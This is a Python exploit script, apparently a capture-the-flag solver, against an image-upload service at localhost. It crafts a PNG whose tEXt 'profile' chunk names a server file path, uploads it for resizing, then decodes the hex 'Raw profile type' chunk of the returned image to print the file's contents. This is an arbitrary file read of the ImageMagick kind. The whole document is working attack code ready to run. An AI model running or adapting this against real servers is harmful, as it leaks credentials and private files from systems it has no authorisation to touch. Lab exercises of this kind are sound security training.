#!/usr/bin/env python3
import requests
import struct
import binascii
import zlib
import os
import sys

BASE_URL = "http://localhost:1337"

def create_payload(filepath, output="payload.png"):
    png_sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">II", 1, 1) + b"\x08\x06\x00\x00\x00"
    ihdr = struct.pack(">I", len(ihdr_data)) + b"IHDR" + ihdr_data
    ihdr += struct.pack(">I", binascii.crc32(ihdr[4:]) & 0xFFFFFFFF)

    text_data = b"profile\x00" + filepath.encode()
    text_chunk = struct.pack(">I", len(text_data)) + b"tEXt" + text_data
    text_chunk += struct.pack(">I", binascii.crc32(text_chunk[4:]) & 0xFFFFFFFF)

    idat_data = b"\x08\x1d\x01\x05\x00\xfa\xff\x00\x00\x00\x00\x00\x00\x05\x00\x01"
    idat = struct.pack(">I", len(idat_data)) + b"IDAT" + idat_data
    idat += struct.pack(">I", binascii.crc32(idat[4:]) & 0xFFFFFFFF)

    iend = struct.pack(">I", 0) + b"IEND"
    iend += struct.pack(">I", binascii.crc32(iend[4:]) & 0xFFFFFFFF)

    with open(output, "wb") as f:
        f.write(png_sig + ihdr + text_chunk + idat + iend)
    return output

def extract_file(image_content):
    idx = 8
    while idx < len(image_content):
        length = struct.unpack(">I", image_content[idx:idx+4])[0]
        chunk_type = image_content[idx+4:idx+8]
        chunk_data = image_content[idx+8:idx+8+length]
        idx += 12 + length

        text_content = ""
        key = ""
        
        if chunk_type == b"zTXt":
            null_idx = chunk_data.find(b"\x00")
            if null_idx != -1:
                key = chunk_data[:null_idx].decode('utf-8', errors='ignore')
                compressed = chunk_data[null_idx+2:]
                try:
                    text_content = zlib.decompress(compressed).decode('utf-8', errors='ignore')
                except Exception:
                    continue
        elif chunk_type == b"tEXt":
            null_idx = chunk_data.find(b"\x00")
            if null_idx != -1:
                key = chunk_data[:null_idx].decode('utf-8', errors='ignore')
                text_content = chunk_data[null_idx+1:].decode('utf-8', errors='ignore')

        # THE FIX: Kita cek string-nya di variabel key, bukan di isinya!
        if key == "Raw profile type":
            hex_lines = []
            for line in text_content.split("\n"):
                clean = line.strip()
                if clean and len(clean) > 8 and all(c in "0123456789abcdefABCDEF" for c in clean):
                    hex_lines.append(clean)
            
            if hex_lines:
                hex_data = "".join(hex_lines)
                try:
                    return binascii.unhexlify(hex_data).decode('utf-8', errors='ignore')
                except Exception as e:
                    print(f"[-] Hex decode error: {e}")
    return None

def exploit(target_file):
    print(f"[*] Generating malicious PNG to read: {target_file}")
    payload_file = create_payload(target_file)
    
    print(f"[*] Uploading payload to {BASE_URL}/upload...")
    with open(payload_file, "rb") as f:
        files = {'image': ('payload.png', f, 'image/png')}
        res = requests.post(f"{BASE_URL}/upload", files=files)
        
    if res.status_code != 200:
        print(f"[-] Upload failed: {res.text}")
        return
        
    out_filename = res.json().get('filename')
    print(f"[+] Upload success. Resized image: {out_filename}")
    
    print(f"[*] Downloading resized image...")
    res_img = requests.get(f"{BASE_URL}/uploads/{out_filename}")
    
    print(f"[*] Extracting leaked data from image chunks...")
    leaked_data = extract_file(res_img.content)
    
    if leaked_data:
        print("\n" + "="*50)
        print(f"[+] EXTRACTED CONTENT OF {target_file}:\n")
        print(leaked_data.strip())
        print("\n" + "="*50 + "\n")
    else:
        print("[-] No leaked data found.")

    os.remove(payload_file)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 solver.py <file_to_read>")
        sys.exit(1)
    exploit(sys.argv[1])
